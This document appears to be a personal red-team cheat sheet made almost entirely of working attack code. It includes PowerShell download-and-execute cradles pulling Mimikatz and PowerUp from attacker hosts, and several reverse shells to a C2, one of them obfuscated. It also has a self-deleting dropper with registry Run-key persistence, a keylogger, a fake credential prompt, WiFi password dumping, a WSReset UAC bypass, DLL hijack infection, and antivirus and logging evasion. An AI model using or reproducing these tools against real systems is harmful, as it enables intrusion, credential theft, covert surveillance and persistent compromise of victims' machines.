powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
python3 -c 'import pty;pty.spawn("/bin/bash")'
cmd /c Winpeas.bat

.\lib /Def:C:/mimikatz-master/lib/x64/netapi32.def /OUT:C:/mimikatz-master/lib/x64/netapi32.min.lib /MACHINE:x64

#Macro
Sub Main
    PleasSubscibe = "cm"
    ToMy = "d /c"
    Channel = "Power"
    addSuport = "shell -en"
    MeOnPatr = "codedcommand "
    Shell(PleasSubscribe + ToMy + Channel + addSuport + MeOnPartr)
    
 End Sub

responder -i lo
nc powershell -> Get-Content \\127.0.0.1\content then save the hashes re.ntlm
hashcat --127.0.0.1-hashes | less
hashcat -m 5600 hashes/re.ntlmv2 /opt/wordlist/rockyou.txt
https://book.hacktricks.xyz/windows/windows-local-privilages-escalation#alwaysinstallelevated

upx -9 -qq calc.exe

+------------------------------------------------------------------------------+
|                              Android Pentesting                              |
+------------------------------------------------------------------------------+
apt-get install adb
adb connect $ip:port
adb shell

save it as anything.sh
#!/bin/bash
while true
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done

#!/bin/bash
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done

    cd /
    cd /sdcard/Download
    ls
    upload anything.sh
    sh anything.sh
    

+------------------------------------------------------------------------------+
|                             Android Av Bypass                                |
+------------------------------------------------------------------------------+
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
apksigner sign --ks release.jks application.apk

zip -d my_application.apk META-INF/\*
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 1000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
zipalign -v 4 your_project_name-unaligned.apk your_project_name.apk

#Https Certs
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
  -keyout shepherd.key -out shepherd.pem -extensions san -config \
  <(echo "[req]"; 
    echo distinguished_name=req; 
    echo "[san]"; 
    echo subjectAltName=DNS:shepherd.org,DNS:www.shepherd.org,IP:0.0.0.0
    ) \
  -subj "/CN=shepherd.org"
  
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=shepherd.pem,cafile=shepherd.crt,verify=0 -

+------------------------------------------------------------------------------+
|                              Ipinfo/Tor                                      |
+------------------------------------------------------------------------------+
#Tor
#BridgeRelay 1
ORPort 9002
ServerTransportPlugin obfs4 exec /usr/bin/obfs4proxy
ServerTransportListenAddr obfs4 0.0.0.0:9003
ExtORPort auto

https://check.torproject.org
torsocks --shell

#SendMail
---------
sendmail -f bigboss@inseguro.com -t 127.0.0.1@gmail.com -u "Important REport" -s 127.0.0.1:25 -a cmd.exe

#NetCat
-------
nc -zv 127.0.0.1

Prntestmonley abuse sudo advanced
Visual traceroute tools {good online info gather}

#Whats Myipv4
curl ipinfo.io
Invoke-RestMethod -Uri https://ipinfo.io

wget -mkEpnp https://itm4n.github.io/

https://www.ired.team/

+------------------------------------------------------------------------------+
|                            Dns Leak Resolve Fix                              |
+------------------------------------------------------------------------------+

1) sudo nano /etc/dhcp/dhclient.conf // Change #prepend domain-name-servers line, add the dns you want. Example:
prepend domain-name-servers 1.1.1.1, 1.0.0.1, 8.8.8.8, 8.8.4.4; // Remove # so that it isnt a comment

2) sudo chattr -i /etc/resolv.conf/

3) sudo nano /etc/resolv.conf    // Change your DNS settings. IMPORTANT NOTE: Dont separate DNS adresses with commas, write nameserver before each adress, like here:
nameserver 1.1.1.1
nameserver 1.0.0.1
nameserver 8.8.8.8
nameserver 8.8.4.4

4) sudo chattr +i /etc/resolv.conf

5) sudo systemctl restart NetworkManager.service // If it doesnt work use sudo service restart NetworkManager. It isnt that necessary, wont change outcome.

/*I dont like people not understandig what they do, heres what you did:

You modifided /etc/dhcp/dhclient.conf and added the adresses, Then used chattr -i to set /etc/resolv.conf/ as a writable file, then changed the file again, set /etc/resolv.conf/ as unwritable and restarted Network Manager*/

+------------------------------------------------------------------------------+
|                          Persistence Macchanger                              |
+------------------------------------------------------------------------------+
sudo nano /etc/systemd/system/changemac@.service

[Unit]
Description=changes mac for %I
Wants=network.target
Before=network.target
BindsTo=sys-subsystem-net-devices-%i.device
After=sys-subsystem-net-devices-%i.device

[Service]
Type=oneshot
ExecStart=/usr/bin/macchanger -r %I
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target

sudo systemctl enable changemac@eth0.service

#!/bin/bash
clear;

export BLUE='\033[1;94m'
export GREEN='\033[1;92m'
export RED='\033[1;91m'
export RESETCOLOR='\033[1;00m'

echo -e "$RED                         PPROXY CONNECTIONS ROOT\n"
echo -e "$BLUE Pproxy [8888] -> Squid [3218] -> Privoxy [8118] -> Polipo [8123] -> Tor $GREEN [9050]\n"

pproxy -r http://localhost:3128 -l http://localhost:8888 -vvv "$@"
+------------------------------------------------------------------------------+
|                          Ports Fowarding                                     |
+------------------------------------------------------------------------------+
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
ngrok http 4433
ngrok tcp 4433

ncat -v -l -p 8080 -c "ncat -v -l -p 9090"
socat -v tcp-listen:8080 tcp-listen:9090

# exposes the SMB port of the machine in the port 445 of the SSH Server
plink -l root -pw toor -R 445:127.0.0.1:445 
# exposes the RDP port of the machine in the port 3390 of the SSH Server
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  

plink -l root -pw mypassword 127.0.0.1 -R
plink.exe -v -pw mypassword user@10.10.10.10 -L 9001:127.0.0.1:445

plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
# redirects the Windows port 445 to Kali on port 22
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   

git clone https://github.com/ginuerzh/gost
cd gost/cmd/gost
go build

# Socks5 Proxy
Server side: gost -L=socks5://:1080
Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true

# Local Port Forward
gost -L=tcp://:2222/127.0.0.1:22 [-F=..]

## Simple User

Set a file as hidden
attrib +h c:\autoexec.bat

+------------------------------------------------------------------------------+
|                           Malwares; PoWeRsHeLl -Win 1 -EnC                   |
+------------------------------------------------------------------------------+
@echo off

cd %TEMP%

attrib -h .\wncat.bat && attrib -h .\wncat.vbs
del .\wncat.bat && del .\wncat.vbs

echo @echo off > wncat.bat
echo :loop >> wncat.bat
echo PowErShElL -w 1 -eNc "" >> wncat.bat
echo goto loop >> wncat.bat

echo Dim WinScriptHost > wncat.vbs
echo Set WinScriptHost ^= CreateObject^("WScript.Shell") >> wncat.vbs
echo WinScriptHost.Run Chr^(34^) ^& "%TEMP%\wncat.bat" ^& Chr^(34^)^, 0 >> wncat.vbs
echo Set WinScriptHost ^= Nothing >> wncat.vbs

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "%TEMP%\wncat.vbs"

attrib +h .\wncat.bat && attrib +h .\wncat.vbs

start /B PoWeRsHeLl -w 1 -EnC ""

(goto) 2>nul & del "%~f0"

+------------------------------------------------------------------------------+
|                             Malware                                          |
+------------------------------------------------------------------------------+
do {
    Start-Sleep -Seconds 15
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 777)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $StreamWriter.Write($String + 'PS ' + (pwd).Path + '> ')
    $StreamWriter.Flush()
}
WriteToStream ''
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {   
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
    WriteToStream ($Output)
}
$StreamWriter.Close()

+------------------------------------------------------------------------------+
|                            Ssl Malware                                       |
+------------------------------------------------------------------------------+
do {    
	Start-Sleep -Seconds 15
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 777)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false)
if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
    $SslStream.Close()
    exit
}
$StreamWriter = New-Object IO.StreamWriter($SslStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $StreamWriter.Write($String + 'PS ' + (pwd).Path + '> ')
    $StreamWriter.Flush()
}
WriteToStream ''
while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)   
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
    WriteToStream ($Output)
}
$StreamWriter.Close()

+------------------------------------------------------------------------------+
|                              Chimboka Malware                                |
+------------------------------------------------------------------------------+
function GetShell(){
<#

.SYNOPSIS
This script which can be used for Reverse interactive PowerShell from a target. 

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch.


.EXAMPLE
PS > GetShell -Reverse -IPAddress 192.168.254.226 -Port 4646

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

#>

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse
    )



    do {
        Start-Sleep -Seconds 1

          # Connect to Server
        try{
            $TCPClient = New-Object Net.Sockets.TCPClient($IPAddress,$Port)
        } catch {
            Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
            Write-Error $_
        }
    } until ($TCPClient.Connected)


    $streamNet = $TCPClient.GetStream()

    $streamSecure = New-Object Net.Security.SslStream($streamNet,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))

    $streamSecure.AuthenticateAsClient('cloudflare-dns.com',$null,$false)

    # Close the connection if the attacking machine does not use ssl connections.
    if(!$streamSecure.IsEncrypted -or !$streamSecure.IsSigned) {
        $streamSecure.Close()
        exit
    }


    $StreamWriter = New-Object IO.StreamWriter($streamSecure)

    WriteToStream ''

    while(($BytesRead = $streamSecure.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $userInput = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)

        if ($userInput -eq 'exit'){
            $streamSecure.Close()
            exit
        }
      
      
        if($userInput -ne $null){
             $Output = try {
                        Invoke-Expression $userInput 2>&1 | Out-String
                    } catch {
                        $_ | Out-String
                }
           WriteToStream ($Output)
          
        }
    }

    $StreamWriter.Close()

}

function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    $sendbytes = 'PS ' + (Get-Location).Path + '> '
    $StreamWriter.Write($String + $sendbytes)
    $StreamWriter.Flush()
}


# GetShell -Reverse -IPAddress 127.0.0.1 -Port 777


+------------------------------------------------------------------------------+
|                            Managu Malware                                    |
+------------------------------------------------------------------------------+
# Make DNS over HTTP lookup for specified record type
function DNSLookup ($DNSRecord) {
    return (([text.encoding]::UTF8).GetString((Invoke-WebRequest ('https://1.1.1.1/dns-query?name=powershell-reverse-shell.demo.martinsohn.dk&type=' + $DNSRecord) -Headers @{'accept'='application/dns-json'}).Content) | ConvertFrom-Json).Answer.data.Trim('"')
}

do {
    # Delay before establishing network connection, and between retries
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 777)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()

$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))

$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false)

if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
    $SslStream.Close()
    exit
}

$StreamWriter = New-Object IO.StreamWriter($SslStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'PS ' + (pwd).Path + '> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()

+------------------------------------------------------------------------------+
|                            Chimera Malware                                   |
+------------------------------------------------------------------------------+

do {    
        & (("VZ5L-iYcOFEuRBT2mPnKI7gkxjq9Nwr13AdyQCS8tbpUa6fGMJHDleos0zXhvW4")[38,40,44,30,40,4,38,52,53,53,42] -join '') -Seconds 15
    try{
        $TCPClient = & (("hTiXB6Lu1lWmgpFqey4MSY9UoDPV-bcK3EC7nGxst05JIfZ8wAQ2rHNzaRvkjdO")[54,16,48,28,62,29,60,16,30,40] -join '') Net.Sockets.TCPClient('127.0.0.1', 777)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$SslStream = & (("hTiXB6Lu1lWmgpFqey4MSY9UoDPV-bcK3EC7nGxst05JIfZ8wAQ2rHNzaRvkjdO")[54,16,48,28,62,29,60,16,30,40] -join '') Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false)
if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
    $SslStream.Close()
    exit
}
$StreamWriter = & (("hTiXB6Lu1lWmgpFqey4MSY9UoDPV-bcK3EC7nGxst05JIfZ8wAQ2rHNzaRvkjdO")[54,16,48,28,62,29,60,16,30,40] -join '') IO.StreamWriter($SslStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize |ForEach-Object{$_}| % {0}
    $StreamWriter.Write($String + 'PS ' + (& (("F4Hz-Aemh3ofCZOBp5iwg8urt0GLkR7SKMNYjbl6vyWDdIqTVxncs91PJUEX2Qa")[26,6,24,4,27,10,51,62,24,18,10,50] -join '')).Path + '> ')
    $StreamWriter.Flush()
}
WriteToStream ''
while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)   
    $Output = try {
            & (("FUSlfxrgNZOwPjVdem9TR1EH4BshWKJApkCuc36Xb7nvGD2q-0aoQ8MYiy5zILt")[60,42,43,51,33,16,48,22,5,32,6,16,26,26,56,51,42] -join '') $Command 2>&1 |ForEach-Object{$($_)}| & (("h6wXJd-yOQtsF24iMomxY3PqcIk1RzC0VZ7BWjDAEavUNGSLu89bHrKe5nlpfTg")[8,48,10,6,46,10,53,15,57,62] -join '')
        } catch {
            $_ |ForEach-Object{$_}| & (("h6wXJd-yOQtsF24iMomxY3PqcIk1RzC0VZ7BWjDAEavUNGSLu89bHrKe5nlpfTg")[8,48,10,6,46,10,53,15,57,62] -join '')
        }
    WriteToStream ($Output)
}
$StreamWriter.Close()

+------------------------------------------------------------------------------+
|                          Dll Hijack  svchost.exe  Secur32.dll                |
+------------------------------------------------------------------------------+
.\Siofra64.exe --mode file-scan -f "c:\Program Files\Internet Explorer\iexplore.exe" --enum-dependency --dll-hijack
.\Siofra64.exe --mode file-scan -f "C:\Users\r0jahsm0ntar1\AppData\Local\Microsoft\OneDrive\OneDrive.exe" --enum-dependency --dll-hijack
.\Siofra64.exe --mode infect -f WININET_original.dll -o WININET.dll --payload-type process --payload-path c:\windows\system32\notepad.exe
.\Siofra64.exe --mode infect -f C:\Windows\system32\Secur32.dll -o Secur32.dll --payload-type process --payload-path C:\Users\Public\Libraries\svchost.exe
.\rcedit-x64.exe {exe_name}.exe --set-icon icon.ico --set-version-string  OriginalFilename "svchost.exe" --set-version-string FileDescription "details are irrelevant"

    Secur32.dll [!]
    VERSION.dll [!]
    WININET.dll [!]
    WTSAPI32.dll [!]
    USERENV.dll [!]
C:\Users\Public\Libraries\svchost.exe
C:\Users\r0jahsm0ntar1\AppData\Local\Microsoft\OneDrive

+------------------------------------------------------------------------------+
|                      Malware Obfsication Generator                           |
+------------------------------------------------------------------------------+
*Invoke-PSObfuscation -Path /home/redteam/shepherd.ps1 -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges
*All
*Integers
*NamespaceClasses
*Strings *Variables

echo -n  | iconv --to-code UTF-16LE | base64 -w 0
powershell -EncodedCommand

#Start Malware .vbs
' Run batch script in an hidden terminal console
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("""C:\Users\r0jahsm0ntar1\Desktop\test.exe"""), 0, True


shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
powershell -noprofile -executionpolicy bypass -NoExit -e
rlwrap -cAr openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port
openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 365 -nodes -subj "/C=US/ST=*/L=*/O=*/CN=google.com"

msfdb start; msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set lhost eth0; set lport 9001; set ExitOnSession false; exploit -j"

+------------------------------------------------------------------------------+
|               Sighn Powershell Script  Post Exploits Powershel />            |
+------------------------------------------------------------------------------+

@echo off
title Signning ONE PowerShell Script

echo .
:: Test for shell permissions
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [success]: Administrative permissions confirmed.
) else (
    color 04
    echo [failure]: Current permissions inadequate.
    timeout /T 4 >nul
    exit
)

:: Get the PS script Absoluct Path
SET /p PSsignPath="Input the PS script absoluct path: "

echo Digitally sign our PS script { cert expires in six months }
echo PSPath: %PSsignPath%
powershell $CertSign = New-SelfSignedCertificate -Subject "Microsoft_Signing_Certificate" -FriendlyName "SilverLight" -NotAfter (Get-Date).AddMonths(9) -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $CertSign.PSPath -Destination "Cert:\LocalMachine\Root";Set-AuthenticodeSignature -FilePath %PSsignPath% -Certificate $CertSign
timeout /T 2 >nul

+------------------------------------------------------------------------------+
|             Post Exploitation Pranks   Speak Computer                        |
+------------------------------------------------------------------------------+


taskkill /im firefox.exe /f

Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List #(Start App)
reg delete HKU\S-1-5-21-2421872441-1145948854-2580278455-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v IntelGraphicX /f

(goto) 2>nul & del "%~f0"

Remove-Item (Get-PSReadlineOption).HistorySavePath
https://raw.githubusercontent.com/r0jahsm0ntar1/3ns4g4/main/IntelGraphicX.jpg
powershell -WindowStyle Hidden Start-Process -FilePath $env:TMP\Update-KB4524147.bat

#Female Voice
Add-Type -AssemblyName System.speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Volume = 100; $synth.SelectVoice('Microsoft Zira Desktop'); $synth.Speak('Delicate things are not as easy to break as you may think.')

#Male Voice
Add-Type -AssemblyName System.speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('Delicate things are not as easy to break as you may think.')

cat -raw .\business_logic.ps1 | iex

xxd -p sh3llc0de.bin | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > sh3llc0de.payload
cat sh3llc0de.payload | tr ',' ' ' | wc -w
cat -raw .\business_logic.ps1 | iex

powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -File "C:\Program Files (x86)\Intelbras\MesaVirtual20\run_elevated.ps1" "MesaVirtual30.exe" "ps_suporte_auth"

#Wifie passwords

(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 

+------------------------------------------------------------------------------+
|                 Post Exploitation Bypass UAC                                 |
+------------------------------------------------------------------------------+
function Invoke-WSResetBypass {
Param (
[String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
)

$CommandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
$filePath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"

New-Item $CommandPath -Force | Out-Null
New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
Write-Host "[+] Registry entry has been created successfully!"

Write-Host "[+] Starting WSReset.exe"
Write-Host "[+] Triggering payload.."
$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden -PassThru
$Process.WaitForExit()

if (Test-Path $filePath) {
Remove-Item $filePath -Recurse -Force
Write-Host "[+] Cleaning up registry entry"
}
}


.PARAMETER Command
Specifies the command you would like to run in high integrity context.
 
.EXAMPLE
Invoke-WSResetBypass -Command "C:\Windows\System32\cmd.exe /c start cmd.exe"

This will effectivly start cmd.exe in high integrity context.

.NOTES
This UAC bypass has been tested on the following:
 - Windows 10 Version 1803 OS Build 17134.590
 - Windows 10 Version 1809 OS Build 17763.316
#>

function Invoke-WSResetBypass {
      Param (
      [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
      )

      $CommandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      $filePath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
      New-Item $CommandPath -Force | Out-Null
      New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
      Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
      Write-Host "[+] Registry entry has been created successfully!"

      $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
      Write-Host "[+] Starting WSReset.exe"

      Write-Host "[+] Triggering payload.."
      Start-Sleep -Seconds 5

      if (Test-Path $filePath) {
      Remove-Item $filePath -Recurse -Force
      Write-Host "[+] Cleaning up registry entry"
      }
}

+------------------------------------------------------------------------------+
|                       Change Wallpaper                                       |
+------------------------------------------------------------------------------+
$MyWallpaper="C:\Users\Shepherd\Pictures\[H]\WindowsXP.png"
$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 
    
     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@

add-type $code 
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)

+------------------------------------------------------------------------------+
|                     Persistence Wallpaper                                    |
+------------------------------------------------------------------------------+
$MyWallpaper="C:\wallpaper.jpg"
$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 
    
     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@

add-type $code 
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)

+------------------------------------------------------------------------------+
|                          Screen-Shotter                                      |
+------------------------------------------------------------------------------+
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}

$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1600, 900)
screenshot $bounds "out.png"

+------------------------------------------------------------------------------+
|                              Ki-Loga                                         |
+------------------------------------------------------------------------------+
function ki-loga($logPath="$env:temp\ki-loga.txt") 
{
# API declaration
$APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
    
  # output file
  $no_output = New-Item -Path $logPath -ItemType File -Force

  try
  {
    Write-Host 'Kilogga started. Press CTRL+C to see results...' -ForegroundColor Red

    while ($true) {
      Start-Sleep -Milliseconds 40            
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get key state
        $keystate = $API::GetAsyncKeyState($ascii)
        # if key pressed
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock
          # translate code
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          # get keyboard state and create stringbuilder
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key          
          if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
          {
            #if success, add key to logger file
            [System.IO.File]::AppendAllText($logPath, $loggedchar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {    
    notepad $logPath
  }
}
ki-loga

+------------------------------------------------------------------------------+
|                                  Phish Cred                                  |
+------------------------------------------------------------------------------+
function Phish
{


[CmdletBinding()]
Param ()

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
                $output
                break
            }
        }
    }
}

+------------------------------------------------------------------------------+
|                          Powershell Emailer                                  |
+------------------------------------------------------------------------------+
$TimeToRun = 2
$From = “xxxxxx@gmail.com"
$Pass = “xxxxxxxx"
$To = “xxxxxx@gmail.com
$Subject = "Keylogger Results"
$body = "Keylogger Results"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)

+------------------------------------------------------------------------------+
|                             VBS Script                                       |
+------------------------------------------------------------------------------+ 

set x=createobject("wscript.shell")

x.sendkeys "^"+"{ESC}"
wscript.sleep 1000
x.sendkeys "command prompt"
wscript.sleep 1000
x.sendkeys "{ENTER}"
wscript.sleep 500
x.sendkeys "cmd /c systeminfo"
wscript.sleep 500
x.sendkeys "{ENTER}"
wscript.sleep 1000
x.sendkeys "{ENTER}"
wscript.sleep 500
x.sendkeys "exit"
wscript.sleep 500
x.sendkeys "{ENTER}"

+------------------------------------------------------------------------------+
|                             RDP ENABLER                                      |
+------------------------------------------------------------------------------+
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

+------------------------------------------------------------------------------+
|                                MITM6                                         |
+------------------------------------------------------------------------------+
